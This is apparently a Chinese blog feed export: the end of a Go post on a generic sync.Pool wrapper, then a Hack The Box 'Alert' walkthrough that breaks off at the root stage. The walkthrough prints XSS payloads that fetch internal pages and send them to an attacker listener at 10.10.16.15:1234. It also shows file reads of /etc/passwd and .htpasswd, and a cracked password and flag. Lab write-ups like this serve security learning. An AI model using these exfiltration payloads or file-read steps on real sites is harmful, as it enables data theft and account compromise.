class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPool</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(newFn <span class="hljs-keyword">func</span>()</span></span> T) *Pool[T] &#123;<br><span class="hljs-keyword">return</span> &amp;Pool[T]&#123;<br>pool: &amp;sync.Pool&#123;<br>New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br><span class="hljs-keyword">return</span> newFn()<br>&#125;,<br>&#125;,<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> Pool[T any] <span class="hljs-keyword">struct</span> &#123;<br>pool *sync.Pool<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Pool[T])</span></span> Put(v T) &#123;<br>p.pool.Put(v)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Pool[T])</span></span> Get() T &#123;<br><span class="hljs-keyword">var</span> v T<br>get := p.pool.Get()<br><span class="hljs-keyword">if</span> get != <span class="hljs-literal">nil</span> &#123;<br>v, _ = get.(T)<br>&#125;<br><span class="hljs-keyword">return</span> v<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>bufferPool := NewPool(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> *bytes.Buffer &#123;<br><span class="hljs-keyword">return</span> bytes.NewBuffer(<span class="hljs-literal">nil</span>)<br>&#125;)<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> <span class="hljs-number">5</span> &#123;<br>buffer := bufferPool.Get()<br>buffer.WriteString(<span class="hljs-string">&quot;sad&quot;</span>)<br>fmt.Println(buffer.String())<br>buffer.Reset()<br>bufferPool.Put(buffer)<br>&#125;<br>&#125;<br>&gt;&gt;<br>sad<br>sad<br>sad<br>sad<br>sad<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>语言</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Alert</title>
    <link href="/2025/03/23/HTB-Alert/"/>
    <url>/2025/03/23/HTB-Alert/</url>
    
    <content type="html"><![CDATA[<p>XSS</p><span id="more"></span><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>先扫</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.44<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 14:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.44<br>Host is up (0.35s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)<br>|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)<br>|_  256 cb:92:ad:6b:<span class="hljs-built_in">fc</span>:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Did not follow redirect to http://alert.htb/<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=3/23%OT=22%CT=1%CU=39522%PV=Y%DS=3%DC=T%G=Y%TM=67DF<br>OS:B016%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)<br>OS:OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53A<br>OS:ST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T<br>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=<br>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF<br>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7FA%RUD=G)IE(R=Y%DFI=N%T=<br>OS:40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 443/tcp)<br>HOP RTT       ADDRESS<br>1   0.27 ms   172.30.144.1<br>2   298.79 ms 10.10.16.1<br>3   368.82 ms 10.10.11.44<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 55.07 seconds<br></code></pre></td></tr></table></figure><p>访问 web 网页发现是一个文件上传，只能上传 md 文件，上传一个带有 xss 的文件，能成功执行 xss</p><p>扫一下目录有几个 php 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://alert.htb  -x php,.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7e86d1c0f62c38d9.png"></p><p>上传之后点击 <code>Share Markdown</code> 将生成的 URL 在 <code>Contact Us</code> 板块进行发送</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://alert.htb/index.php&quot;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://10.10.16.15:1234/?text=<span class="hljs-subst">$&#123;btoa(text)&#125;</span>`</span>);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://10.10.16.15:1234/?err=<span class="hljs-subst">$&#123;err&#125;</span>`</span>);<br>        &#125;);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>上传之后点击 <code>Share Markdown</code> 将生成的 URL 在 <code>Contact Us</code> 板块进行发送</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ef075b6f0fd21b5.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/831fe72fbafec063.png"></p><p>启动监听</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee5b913233e2c638.png"></p><p>解码得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Alert - Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=alert&quot;</span>&gt;</span>Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=contact&quot;</span>&gt;</span>Contact Us<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=about&quot;</span>&gt;</span>About Us<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=donate&quot;</span>&gt;</span>Donate<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-container&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;visualizer.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">&quot;.md&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;View Markdown&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: black;&quot;</span>&gt;</span>?2024 Alert. All rights reserved.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后试试 <code>message.php</code> 页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://alert.htb/messages.php&quot;</span>)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.10.16.15:1234/?file_content=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(data));&#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/253675b58065147a.png"></p><p>进行 URL 解码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.<span class="hljs-property">php</span>%3Ffile%3D2024-<span class="hljs-number">03</span>-<span class="hljs-number">10_15</span>-<span class="hljs-number">48</span>-<span class="hljs-number">34.</span>txt%<span class="hljs-number">27</span>%<span class="hljs-number">3E2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">10_15</span>-<span class="hljs-number">48</span>-<span class="hljs-number">34.</span>txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A<br>:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Messages<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;messages.php?file=2024-03-10_15-48-34.txt&#x27;</span>&gt;</span>2024-03-10_15-48-34.txt<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>接受了一个 <code>file</code> 参数，那么像前面一样去读取一下 <code>/etc/passwd</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/d0c5fa159375f6d1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;pre&gt;root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>albert:x:1000:1000:albert:/home/albert:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>david:x:1001:1002:,,,:/home/david:/bin/bash<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>读取 <code>/etc/hosts</code> 文件，得到了子域</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> localhost<br><span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> alert<br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> alert.<span class="hljs-property">htb</span><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span><br><br># <span class="hljs-title class_">The</span> following lines are desirable <span class="hljs-keyword">for</span> <span class="hljs-title class_">IPv6</span> capable hosts<br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br><span class="hljs-attr">fe00</span>::<span class="hljs-number">0</span> ip6-localnet<br><span class="hljs-attr">ff00</span>::<span class="hljs-number">0</span> ip6-mcastprefix<br><span class="hljs-attr">ff02</span>::<span class="hljs-number">1</span> ip6-allnodes<br><span class="hljs-attr">ff02</span>::<span class="hljs-number">2</span> ip6-allrouters<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>访问 <code>statistics.alert.htb</code> 发现需要密码登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/69f8231413bdb109.png"></p><p>网站是 Apache 服务器，读取它的配置文件 <code>/etc/apache2/sites-available/000-default.conf</code></p><p><a href="https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/">敏感文件搜集</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/f73ee8d2d16630ec.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^alert\.<span class="hljs-property">htb$</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^$<br>    <span class="hljs-title class_">RewriteRule</span> ^<span class="hljs-regexp">/?(.*)$ http:/</span><span class="hljs-regexp">/alert.htb/</span>$1 [R=<span class="hljs-number">301</span>,L]<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br>        <span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span> <span class="hljs-title class_">FollowSymLinks</span> <span class="hljs-title class_">MultiViews</span><br>        <span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">All</span><br>        <span class="hljs-title class_">AuthType</span> <span class="hljs-title class_">Basic</span><br>        <span class="hljs-title class_">AuthName</span> <span class="hljs-string">&quot;Restricted Area&quot;</span><br>        <span class="hljs-title class_">AuthUserFile</span> /<span class="hljs-keyword">var</span>/www/statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span>/.<span class="hljs-property">htpasswd</span><br>        <span class="hljs-title class_">Require</span> valid-user<br>    &lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br>&lt;/pre&gt;<br><br></code></pre></td></tr></table></figure><p>根据配置文件信息去读取 <code>/var/www/statistics.alert.htb/.htpasswd</code> 文件</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">&lt;pre&gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>URL 解码后还有一层加密，john 破解</p><p><img src="https://img.dkdun.cn/v1/2025/12/3a7eea225b64bd2f.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">albert:</span>manchesterunited<br></code></pre></td></tr></table></figure><p>尝试直接登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/8ca88f89e7a9c453.png"></p><p>啥有用的都没有，ssh 登录，拿到 user flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">59e3b7beba7b4b3802988ebd8f91fb26<br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>发现还存在另一个用户 